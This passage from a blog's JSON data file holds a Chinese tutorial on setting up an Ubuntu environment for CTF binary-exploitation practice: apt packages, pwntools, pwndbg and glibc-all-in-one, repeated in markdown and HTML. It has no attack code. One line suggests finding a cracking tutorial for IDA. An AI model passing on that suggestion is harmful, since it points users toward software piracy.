官方软件源安装，稳定性较高，但可能不是最新版本。\n\n#### 方式三：通过国内清华源安装（解决网络问题）\n\n如果在安装过程中遇到网络超时、下载速度慢等问题，可使用国内的清华 PyPI 源进行安装，在终端粘贴：\n\n\n\n```shell\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools\n```\n\n`-i https://pypi.tuna.tsinghua.edu.cn/simple`参数指定了使用清华的 PyPI 源，能有效提高国内用户的下载速度。\n\n### 步骤 3：安装增强型调试工具 ——pwndbg\n\ngdb 是常用的调试工具，但默认功能较为基础，pwndbg 是 gdb 的一个增强插件，它添加了彩色显示、自动加载调试符号、便捷的调试命令等功能，能让 Pwn 调试过程更加高效。\n\n#### 第一步：克隆 pwndbg 仓库\n\n首先需要从 GitHub 上克隆 pwndbg 的代码仓库到本地，在终端粘贴以下命令（若第一个链接克隆速度慢，可使用第二个国内镜像链接）：\n\n\n\n```shell\n# 方式一：官方GitHub链接\n\ngit clone https://github.com/pwndbg/pwndbg\n\n# 方式二：国内镜像链接（推荐国内用户使用）\n\ngit clone https://gitclone.com/github.com/pwndbg/pwndbg.git\n```\n\n`git clone`命令用于从远程代码仓库克隆代码到本地，执行后会在当前终端所在目录下生成一个名为`pwndbg`的文件夹，里面包含 pwndbg 的所有代码。\n\n#### 第二步：进入 pwndbg 目录并执行安装脚本\n\n克隆完成后，需要进入 pwndbg 文件夹，然后执行安装脚本进行安装，在终端依次粘贴以下命令：\n\n\n\n```shell\ncd pwndbg\n\n./setup.sh\n```\n\n\n\n*   `cd pwndbg`：进入刚刚克隆生成的 pwndbg 目录，只有进入该目录才能执行后续的安装脚本。\n\n*   `./setup.sh`：执行 pwndbg 的安装脚本，该脚本会自动安装 pwndbg 所需的依赖，并完成 gdb 插件的配置。\n\n#### 安装过程中的特殊处理（若出现依赖安装失败问题）\n\n如果在执行`./setup.sh`时遇到依赖安装失败的情况，可尝试先通过国内源安装 uv 工具（用于依赖管理），再进行依赖同步，在终端粘贴以下命令：\n\n\n\n```shell\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple uv  --break-system-packages\n\nuv sync --index-url https://mirrors.aliyun.com/pypi/simple/\n```\n\n执行完成后，再次运行`./setup.sh`即可继续完成 pwndbg 的安装。\n\n### 步骤 4：安装多版本 glibc 集合 ——glibc-all-in-one\n\n在 Pwn 题目中，不同的题目可能依赖不同版本的 glibc（GNU C 库），而系统默认的 glibc 版本固定，无法满足多种版本需求。glibc-all-in-one 是一个整合了多种常见版本 glibc 的工具集，安装后可以方便地为不同题目切换对应的 glibc 版本，避免因 glibc 版本不匹配导致题目无法运行或调试。\n\n在终端粘贴以下命令进行安装：\n\n\n\n```shell\ngit clone https://github.com/matrix1001/glibc-all-in-one.git \\~/glibc-all-in-one\n```\n\n\n\n*   `git clone https://github.com/matrix1001/glibc-all-in-one.git`：克隆 glibc-all-in-one 的代码仓库。\n\n*   `~/glibc-all-in-one`：指定将仓库克隆到当前用户的家目录（`~`代表家目录）下的`glibc-all-in-one`文件夹中，这样后续查找和使用该工具集会更加方便。\n\n## 三、环境配置验证\n\n完成以上所有步骤后，我们可以通过简单的操作验证环境是否配置成功：\n\n\n\n1.  **验证 pwntools**：在终端输入`python3`进入 Python 交互环境，然后输入`from pwn import *`，若没有报错，则说明 pwntools 安装成功。\n\n2.  **验证 pwndbg**：在终端输入`gdb`，若进入 gdb 界面后显示有`pwndbg`相关的提示信息（如彩色的版本号、欢迎语等），则说明 pwndbg 配置成功。\n\n3.  **验证 glibc-all-in-one**：进入家目录，查看是否存在`glibc-all-in-one`文件夹，进入该文件夹后若能看到包含不同 glibc 版本的文件，则说明安装成功。\n\n\n\n# IDA安装\n\nIDA是帮助我们分析二进制文件的工具，可以自行上网找找破解教程（\n\n> ","slug":"Day 01 pwn环境配置","published":1,"updated":"2025-09-22T06:08:22.822Z","_id":"cmeut9edi0001kot81vp174w8","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"Ubuntu-下-Pwn-环境配置\"><a href=\"#Ubuntu-下-Pwn-环境配置\" class=\"headerlink\" title=\"Ubuntu 下 Pwn 环境配置\"></a>Ubuntu 下 Pwn 环境配置</h1><p>Pwn 是 CTF（Capture The Flag）竞赛中的重要方向，主要涉及二进制漏洞利用，而一套完善的 Pwn 环境是开展 Pwn 学习和竞赛的基础。本教程将带领大家在 Ubuntu 系统中，通过一系列命令逐步完成 Pwn 环境的配置，涵盖基础依赖库、工具安装以及关键辅助工具部署，即使是新手也能轻松跟随操作。</p>\n<h2 id=\"一、环境配置前的准备\"><a href=\"#一、环境配置前的准备\" class=\"headerlink\" title=\"一、环境配置前的准备\"></a>一、环境配置前的准备</h2><p>在开始配置 Pwn 环境前，请确保你的 Ubuntu 系统处于正常联网状态，因为后续所有操作都需要通过网络下载相关软件包和工具。同时，建议以具有 sudo 权限的用户登录系统，避免因权限不足导致命令执行失败。打开 Ubuntu 的终端（可以通过快捷键<code>Ctrl + Alt + T</code>快速调出），接下来我们将分四个步骤执行命令完成配置。</p>\n<h2 id=\"二、分步执行命令配置环境\"><a href=\"#二、分步执行命令配置环境\" class=\"headerlink\" title=\"二、分步执行命令配置环境\"></a>二、分步执行命令配置环境</h2><h3 id=\"步骤-1：安装基础依赖库与常用工具\"><a href=\"#步骤-1：安装基础依赖库与常用工具\" class=\"headerlink\" title=\"步骤 1：安装基础依赖库与常用工具\"></a>步骤 1：安装基础依赖库与常用工具</h3><p>这一步是环境配置的基础，我们需要更新系统软件源并升级已安装的软件，同时安装编译工具、编程语言环境、文本编辑器、调试工具以及必要的库文件，这些工具和库文件将为后续 Pwn 工具的安装和使用提供支持。</p>\n<p>在终端中粘贴以下命令并回车执行（命令较长，粘贴时确保完整，执行过程中可能需要输入当前用户的密码，输入密码时终端不会显示字符，正常输入即可）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install -y build-essential gcc g++ make cmake git curl wget unzip \\</span><br><span class=\"line\"></span><br><span class=\"line\">      python3 python3-pip python3-venv \\</span><br><span class=\"line\"></span><br><span class=\"line\">      vim gdb gdb-multiarch tmux patchelf \\</span><br><span class=\"line\"></span><br><span class=\"line\">      libc6-dev-i386 libc6-dbg libc6-dbg:i386 \\</span><br><span class=\"line\"></span><br><span class=\"line\">      lib32z1 lib32ncurses6 lib32stdc++6</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>sudo apt update</code>：用于更新 Ubuntu 系统的软件源列表，让系统知道最新的软件版本信息。</p>\n</li>\n<li><p><code>sudo apt upgrade -y</code>：根据更新后的软件源列表，升级系统中已安装的软件，<code>-y</code>参数表示自动确认所有升级操作，无需手动输入<code>y</code>确认。</p>\n</li>\n<li><p><code>sudo apt install -y</code>：用于安装指定的软件包，<code>-y</code>参数同样是自动确认安装操作。后面紧跟的一系列软件包中，<code>build-essential</code>是编译工具集，<code>gcc</code>、<code>g++</code>是 C 和 C++ 编译器，<code>python3</code>及相关组件是 Python 环境，<code>vim</code>是文本编辑器，<code>gdb</code>系列是调试工具，<code>libc6</code>相关库文件则是为了支持 32 位程序的运行和调试。</p>\n</li>\n</ul>\n<h3 id=\"步骤-2：安装-Pwn-核心工具-——pwntools\"><a href=\"#步骤-2：安装-Pwn-核心工具-——pwntools\" class=\"headerlink\" title=\"步骤 2：安装 Pwn 核心工具 ——pwntools\"></a>步骤 2：安装 Pwn 核心工具 ——pwntools</h3><p>pwntools 是 Pwn 方向最常用的 Python 库，它集成了大量用于二进制文件分析、漏洞利用的功能，能够极大提高 Pwn 操作的效率。我们提供了三种安装方式，大家可以根据自己的情况选择，推荐优先尝试前两种，若遇到网络问题可尝试第三种国内源安装方式。</p>\n<h4 id=\"方式一：通过-pip3-直接安装（推荐优先尝试）\"><a href=\"#方式一：通过-pip3-直接安装（推荐优先尝试）\" class=\"headerlink\" title=\"方式一：通过 pip3 直接安装（推荐优先尝试）\"></a>方式一：通过 pip3 直接安装（推荐优先尝试）</h4><p>在终端粘贴以下命令并执行：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install --upgrade pip</span><br><span class=\"line\"></span><br><span class=\"line\">pip3 install pwntools</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>pip3 install --upgrade pip</code>：先将 pip3（Python 的包管理工具）升级到最新版本，确保后续安装 pwntools 时不会因 pip 版本过低出现问题。</p>\n</li>\n<li><p><code>pip3 install pwntools</code>：使用 pip3 安装 pwntools 库。</p>\n</li>\n</ul>\n<h4 id=\"方式二：通过-apt-包管理器安装\"><a href=\"#方式二：通过-apt-包管理器安装\" class=\"headerlink\" title=\"方式二：通过 apt 包管理器安装\"></a>方式二：通过 apt 包管理器安装</h4><p>若方式一安装失败，可尝试此方式，在终端粘贴命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python3-pwntools</span><br></pre></td></tr></table></figure>\n\n<p>这种方式通过 Ubuntu 官方软件源安装，稳定性较高，但可能不是最新版本。</p>\n<h4 id=\"方式三：通过国内清华源安装（解决网络问题）\"><a href=\"#方式三：通过国内清华源安装（解决网络问题）\" class=\"headerlink\" title=\"方式三：通过国内清华源安装（解决网络问题）\"></a>方式三：通过国内清华源安装（解决网络问题）</h4><p>如果在安装过程中遇到网络超时、下载速度慢等问题，可使用国内的清华 PyPI 源进行安装，在终端粘贴：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools</span><br></pre></td></tr></table></figure>\n\n<p><code>-i https://pypi.tuna.tsinghua.edu.cn/simple</code>参数指定了使用清华的 PyPI 源，能有效提高国内用户的下载速度。</p>\n<h3 id=\"步骤-3：安装增强型调试工具-——pwndbg\"><a href=\"#步骤-3：安装增强型调试工具-——pwndbg\" class=\"headerlink\" title=\"步骤 3：安装增强型调试工具 ——pwndbg\"></a>步骤 3：安装增强型调试工具 ——pwndbg</h3><p>gdb 是常用的调试工具，但默认功能较为基础，pwndbg 是 gdb 的一个增强插件，它添加了彩色显示、自动加载调试符号、便捷的调试命令等功能，能让 Pwn 调试过程更加高效。</p>\n<h4 id=\"第一步：克隆-pwndbg-仓库\"><a href=\"#第一步：克隆-pwndbg-仓库\" class=\"headerlink\" title=\"第一步：克隆 pwndbg 仓库\"></a>第一步：克隆 pwndbg 仓库</h4><p>首先需要从 GitHub 上克隆 pwndbg 的代码仓库到本地，在终端粘贴以下命令（若第一个链接克隆速度慢，可使用第二个国内镜像链接）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">方式一：官方GitHub链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">git clone https://github.com/pwndbg/pwndbg</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">方式二：国内镜像链接（推荐国内用户使用）</span></span><br><span class=\"line\"></span><br><span class=\"line\">git clone https://gitclone.com/github.com/pwndbg/pwndbg.git</span><br></pre></td></tr></table></figure>\n\n<p><code>git clone</code>命令用于从远程代码仓库克隆代码到本地，执行后会在当前终端所在目录下生成一个名为<code>pwndbg</code>的文件夹，里面包含 pwndbg 的所有代码。</p>\n<h4 id=\"第二步：进入-pwndbg-目录并执行安装脚本\"><a href=\"#第二步：进入-pwndbg-目录并执行安装脚本\" class=\"headerlink\" title=\"第二步：进入 pwndbg 目录并执行安装脚本\"></a>第二步：进入 pwndbg 目录并执行安装脚本</h4><p>克隆完成后，需要进入 pwndbg 文件夹，然后执行安装脚本进行安装，在终端依次粘贴以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd pwndbg</span><br><span class=\"line\"></span><br><span class=\"line\">./setup.sh</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>cd pwndbg</code>：进入刚刚克隆生成的 pwndbg 目录，只有进入该目录才能执行后续的安装脚本。</p>\n</li>\n<li><p><code>./setup.sh</code>：执行 pwndbg 的安装脚本，该脚本会自动安装 pwndbg 所需的依赖，并完成 gdb 插件的配置。</p>\n</li>\n</ul>\n<h4 id=\"安装过程中的特殊处理（若出现依赖安装失败问题）\"><a href=\"#安装过程中的特殊处理（若出现依赖安装失败问题）\" class=\"headerlink\" title=\"安装过程中的特殊处理（若出现依赖安装失败问题）\"></a>安装过程中的特殊处理（若出现依赖安装失败问题）</h4><p>如果在执行<code>./setup.sh</code>时遇到依赖安装失败的情况，可尝试先通过国内源安装 uv 工具（用于依赖管理），再进行依赖同步，在终端粘贴以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple uv  --break-system-packages</span><br><span class=\"line\"></span><br><span class=\"line\">uv sync --index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n\n<p>执行完成后，再次运行<code>./setup.sh</code>即可继续完成 pwndbg 的安装。</p>\n<h3 id=\"步骤-4：安装多版本-glibc-集合-——glibc-all-in-one\"><a href=\"#步骤-4：安装多版本-glibc-集合-——glibc-all-in-one\" class=\"headerlink\" title=\"步骤 4：安装多版本 glibc 集合 ——glibc-all-in-one\"></a>步骤 4：安装多版本 glibc 集合 ——glibc-all-in-one</h3><p>在 Pwn 题目中，不同的题目可能依赖不同版本的 glibc（GNU C 库），而系统默认的 glibc 版本固定，无法满足多种版本需求。glibc-all-in-one 是一个整合了多种常见版本 glibc 的工具集，安装后可以方便地为不同题目切换对应的 glibc 版本，避免因 glibc 版本不匹配导致题目无法运行或调试。</p>\n<p>在终端粘贴以下命令进行安装：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/matrix1001/glibc-all-in-one.git \\~/glibc-all-in-one</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>git clone https://github.com/matrix1001/glibc-all-in-one.git</code>：克隆 glibc-all-in-one 的代码仓库。</p>\n</li>\n<li><p><code>~/glibc-all-in-one</code>：指定将仓库克隆到当前用户的家目录（<code>~</code>代表家目录）下的<code>glibc-all-in-one</code>文件夹中，这样后续查找和使用该工具集会更加方便。</p>\n</li>\n</ul>\n<h2 id=\"三、环境配置验证\"><a href=\"#三、环境配置验证\" class=\"headerlink\" title=\"三、环境配置验证\"></a>三、环境配置验证</h2><p>完成以上所有步骤后，我们可以通过简单的操作验证环境是否配置成功：</p>\n<ol>\n<li><p><strong>验证 pwntools</strong>：在终端输入<code>python3</code>进入 Python 交互环境，然后输入<code>from pwn import *</code>，若没有报错，则说明 pwntools 安装成功。</p>\n</li>\n<li><p><strong>验证 pwndbg</strong>：在终端输入<code>gdb</code>，若进入 gdb 界面后显示有<code>pwndbg</code>相关的提示信息（如彩色的版本号、欢迎语等），则说明 pwndbg 配置成功。</p>\n</li>\n<li><p><strong>验证 glibc-all-in-one</strong>：进入家目录，查看是否存在<code>glibc-all-in-one</code>文件夹，进入该文件夹后若能看到包含不同 glibc 版本的文件，则说明安装成功。</p>\n</li>\n</ol>\n<h1 id=\"IDA安装\"><a href=\"#IDA安装\" class=\"headerlink\" title=\"IDA安装\"></a>IDA安装</h1><p>IDA是帮助我们分析二进制文件的工具，可以自行上网找找破解教程（</p>\n<blockquote>\n</blockquote>\n","excerpt":"","more":"<h1 id=\"Ubuntu-下-Pwn-环境配置\"><a href=\"#Ubuntu-下-Pwn-环境配置\" class=\"headerlink\" title=\"Ubuntu 下 Pwn 环境配置\"></a>Ubuntu 下 Pwn 环境配置</h1><p>Pwn 是 CTF（Capture The Flag）竞赛中的重要方向，主要涉及二进制漏洞利用，而一套完善的 Pwn 环境是开展 Pwn 学习和竞赛的基础。本教程将带领大家在 Ubuntu 系统中，通过一系列命令逐步完成 Pwn 环境的配置，涵盖基础依赖库、工具安装以及关键辅助工具部署，即使是新手也能轻松跟随操作。</p>\n<h2 id=\"一、环境配置前的准备\"><a href=\"#一、环境配置前的准备\" class=\"headerlink\" title=\"一、环境配置前的准备\"></a>一、环境配置前的准备</h2><p>在开始配置 Pwn 环境前，请确保你的 Ubuntu 系统处于正常联网状态，因为后续所有操作都需要通过网络下载相关软件包和工具。同时，建议以具有 sudo 权限的用户登录系统，避免因权限不足导致命令执行失败。打开 Ubuntu 的终端（可以通过快捷键<code>Ctrl + Alt + T</code>快速调出），接下来我们将分四个步骤执行命令完成配置。</p>\n<h2 id=\"二、分步执行命令配置环境\"><a href=\"#二、分步执行命令配置环境\" class=\"headerlink\" title=\"二、分步执行命令配置环境\"></a>二、分步执行命令配置环境</h2><h3 id=\"步骤-1：安装基础依赖库与常用工具\"><a href=\"#步骤-1：安装基础依赖库与常用工具\" class=\"headerlink\" title=\"步骤 1：安装基础依赖库与常用工具\"></a>步骤 1：安装基础依赖库与常用工具</h3><p>这一步是环境配置的基础，我们需要更新系统软件源并升级已安装的软件，同时安装编译工具、编程语言环境、文本编辑器、调试工具以及必要的库文件，这些工具和库文件将为后续 Pwn 工具的安装和使用提供支持。</p>\n<p>在终端中粘贴以下命令并回车执行（命令较长，粘贴时确保完整，执行过程中可能需要输入当前用户的密码，输入密码时终端不会显示字符，正常输入即可）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install -y build-essential gcc g++ make cmake git curl wget unzip \\</span><br><span class=\"line\"></span><br><span class=\"line\">      python3 python3-pip python3-venv \\</span><br><span class=\"line\"></span><br><span class=\"line\">      vim gdb gdb-multiarch tmux patchelf \\</span><br><span class=\"line\"></span><br><span class=\"line\">      libc6-dev-i386 libc6-dbg libc6-dbg:i386 \\</span><br><span class=\"line\"></span><br><span class=\"line\">      lib32z1 lib32ncurses6 lib32stdc++6</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>sudo apt update</code>：用于更新 Ubuntu 系统的软件源列表，让系统知道最新的软件版本信息。</p>\n</li>\n<li><p><code>sudo apt upgrade -y</code>：根据更新后的软件源列表，升级系统中已安装的软件，<code>-y</code>参数表示自动确认所有升级操作，无需手动输入<code>y</code>确认。</p>\n</li>\n<li><p><code>sudo apt install -y</code>：用于安装指定的软件包，<code>-y</code>参数同样是自动确认安装操作。后面紧跟的一系列软件包中，<code>build-essential</code>是编译工具集，<code>gcc</code>、<code>g++</code>是 C 和 C++ 编译器，<code>python3</code>及相关组件是 Python 环境，<code>vim</code>是文本编辑器，<code>gdb</code>系列是调试工具，<code>libc6</code>相关库文件则是为了支持 32 位程序的运行和调试。</p>\n</li>\n</ul>\n<h3 id=\"步骤-2：安装-Pwn-核心工具-——pwntools\"><a href=\"#步骤-2：安装-Pwn-核心工具-——pwntools\" class=\"headerlink\" title=\"步骤 2：安装 Pwn 核心工具 ——pwntools\"></a>步骤 2：安装 Pwn 核心工具 ——pwntools</h3><p>pwntools 是 Pwn 方向最常用的 Python 库，它集成了大量用于二进制文件分析、漏洞利用的功能，能够极大提高 Pwn 操作的效率。我们提供了三种安装方式，大家可以根据自己的情况选择，推荐优先尝试前两种，若遇到网络问题可尝试第三种国内源安装方式。</p>\n<h4 id=\"方式一：通过-pip3-直接安装（推荐优先尝试）\"><a href=\"#方式一：通过-pip3-直接安装（推荐优先尝试）\" class=\"headerlink\" title=\"方式一：通过 pip3 直接安装（推荐优先尝试）\"></a>方式一：通过 pip3 直接安装（推荐优先尝试）</h4><p>在终端粘贴以下命令并执行：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install --upgrade pip</span><br><span class=\"line\"></span><br><span class=\"line\">pip3 install pwntools</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>pip3 install --upgrade pip</code>：先将 pip3（Python 的包管理工具）升级到最新版本，确保后续安装 pwntools 时不会因 pip 版本过低出现问题。</p>\n</li>\n<li><p><code>pip3 install pwntools</code>：使用 pip3 安装 pwntools 库。</p>\n</li>\n</ul>\n<h4 id=\"方式二：通过-apt-包管理器安装\"><a href=\"#方式二：通过-apt-包管理器安装\" class=\"headerlink\" title=\"方式二：通过 apt 包管理器安装\"></a>方式二：通过 apt 包管理器安装</h4><p>若方式一安装失败，可尝试此方式，在终端粘贴命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python3-pwntools</span><br></pre></td></tr></table></figure>\n\n<p>这种方式通过 Ubuntu 官方软件源安装，稳定性较高，但可能不是最新版本。</p>\n<h4 id=\"方式三：通过国内清华源安装（解决网络问题）\"><a href=\"#方式三：通过国内清华源安装（解决网络问题）\" class=\"headerlink\" title=\"方式三：通过国内清华源安装（解决网络问题）\"></a>方式三：通过国内清华源安装（解决网络问题）</h4><p>如果在安装过程中遇到网络超时、下载速度慢等问题，可使用国内的清华 PyPI 源进行安装，在终端粘贴：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools</span><br></pre></td></tr></table></figure>\n\n<p><code>-i https://pypi.tuna.tsinghua.edu.cn/simple</code>参数指定了使用清华的 PyPI 源，能有效提高国内用户的下载速度。</p>\n<h3 id=\"步骤-3：安装增强型调试工具-——pwndbg\"><a href=\"#步骤-3：安装增强型调试工具-——pwndbg\" class=\"headerlink\" title=\"步骤 3：安装增强型调试工具 ——pwndbg\"></a>步骤 3：安装增强型调试工具 ——pwndbg</h3><p>gdb 是常用的调试工具，但默认功能较为基础，pwndbg 是 gdb 的一个增强插件，它添加了彩色显示、自动加载调试符号、便捷的调试命令等功能，能让 Pwn 调试过程更加高效。</p>\n<h4 id=\"第一步：克隆-pwndbg-仓库\"><a href=\"#第一步：克隆-pwndbg-仓库\" class=\"headerlink\" title=\"第一步：克隆 pwndbg 仓库\"></a>第一步：克隆 pwndbg 仓库</h4><p>首先需要从 GitHub 上克隆 pwndbg 的代码仓库到本地，在终端粘贴以下命令（若第一个链接克隆速度慢，可使用第二个国内镜像链接）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">方式一：官方GitHub链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">git clone https://github.com/pwndbg/pwndbg</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">方式二：国内镜像链接（推荐国内用户使用）</span></span><br><span class=\"line\"></span><br><span class=\"line\">git clone https://gitclone.com/github.com/pwndbg/pwndbg.git</span><br></pre></td></tr></table></figure>\n\n<p><code>git clone</code>命令用于从远程代码仓库克隆代码到本地，执行后会在当前终端所在目录下生成一个名为<code>pwndbg</code>的文件夹，里面包含 pwndbg 的所有代码。</p>\n<h4 id=\"第二步：进入-pwndbg-目录并执行安装脚本\"><a href=\"#第二步：进入-pwndbg-目录并执行安装脚本\" class=\"headerlink\" title=\"第二步：进入 pwndbg 目录并执行安装脚本\"></a>第二步：进入 pwndbg 目录并执行安装脚本</h4><p>克隆完成后，需要进入 pwndbg 文件夹，然后执行安装脚本进行安装，在终端依次粘贴以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd pwndbg</span><br><span class=\"line\"></span><br><span class=\"line\">./setup.sh</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>cd pwndbg</code>：进入刚刚克隆生成的 pwndbg 目录，只有进入该目录才能执行后续的安装脚本。</p>\n</li>\n<li><p><code>./setup.sh</code>：执行 pwndbg 的安装脚本，该脚本会自动安装 pwndbg 所需的依赖，并完成 gdb 插件的配置。</p>\n</li>\n</ul>\n<h4 id=\"安装过程中的特殊处理（若出现依赖安装失败问题）\"><a href=\"#安装过程中的特殊处理（若出现依赖安装失败问题）\" class=\"headerlink\" title=\"安装过程中的特殊处理（若出现依赖安装失败问题）\"></a>安装过程中的特殊处理（若出现依赖安装失败问题）</h4><p>如果在执行<code>./setup.sh</code>时遇到依赖安装失败的情况，可尝试先通过国内源安装 uv 工具（用于依赖管理），再进行依赖同步，在终端粘贴以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple uv  --break-system-packages</span><br><span class=\"line\"></span><br><span class=\"line\">uv sync --index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n\n<p>执行完成后，再次运行<code>./setup.sh</code>即可继续完成 pwndbg 的安装。</p>\n<h3 id=\"步骤-4：安装多版本-glibc-集合-——glibc-all-in-one\"><a href=\"#步骤-4：安装多版本-glibc-集合-——glibc-all-in-one\" class=\"headerlink\" title=\"步骤 4：安装多版本 glibc 集合 ——glibc-all-in-one\"></a>步骤 4：安装多版本 glibc 集合 ——glibc-all-in-one</h3><p>在 Pwn 题目中，不同的题目可能依赖不同版本的 glibc（GNU C 库），而系统默认的 glibc 版本固定，无法满足多种版本需求。glibc-all-in-one 是一个整合了多种常见版本 glibc 的工具集，安装后可以方便地为不同题目切换对应的 glibc 版本，避免因 glibc 版本不匹配导致题目无法运行或调试。</p>\n<p>在终端粘贴以下命令进行安装：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/matrix1001/glibc-all-in-one.git \\~/glibc-all-in-one</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p><code>git clone https://github.com/matrix1001/glibc-all-in-one.git</code>：克隆 glibc-all-in-one 的代码仓库。</p>\n</li>\n<li><p><code>~/glibc-all-in-one</code>：指定将仓库克隆到当前用户的家目录（<code>~</code>代表家目录）下的<code>glibc-all-in-one</code>文件夹中，这样后续查找和使用该工具集会更加方便。</p>\n</li>\n</ul>\n<h2 id=\"三、环境配置验证\"><a href=\"#三、环境配置验证\" class=\"headerlink\" title=\"三、环境配置验证\"></a>三、环境配置验证</h2><p>完成以上所有步骤后，我们可以通过简单的操作验证环境是否配置成功：</p>\n<ol>\n<li><p><strong>验证 pwntools</strong>：在终端输入<code>python3</code>进入 Python 交互环境，然后输入<code>from pwn import *</code>，若没有报错，则说明 pwntools 安装成功。</p>\n</li>\n<li><p><strong>验证 pwndbg</strong>：在终端输入<code>gdb</code>，若进入 gdb 界面后显示有<code>pwndbg</code>相关的提示信息（如彩色的版本号、欢迎语等），则说明 pwndbg 配置成功。</p>\n</li>\n<li><p><strong>验证 glibc-all-in-one</strong>：进入家目录，查看是否存在<code>glibc-all-in-one</code>文件夹，进入该文件夹后若能看到包含不同 glibc 版本的文件，则说明安装成功。</p>\n</li>\n</ol>\n<h1 id=\"IDA安装\"><a href=\"#IDA安装\" class=\"headerlink\" title=\"IDA安装\"></a>IDA安装</h1><p>IDA是帮助我们分析二进制文件的工具，可以自行上网找找破解教程（</p>\n<blockquote>\n</blockquote>\n"},{"title":"Day 02 程序保护机制即绕过思路","date":"2025-08-27T16:00:00.000Z","top_img":"/images/background/03.jpg","cover":"/images/background/02.png","_content":"\n# ELF 文件的常见保护机制及绕过思路\n\n在 Pwn题目中，ELF（Executable and 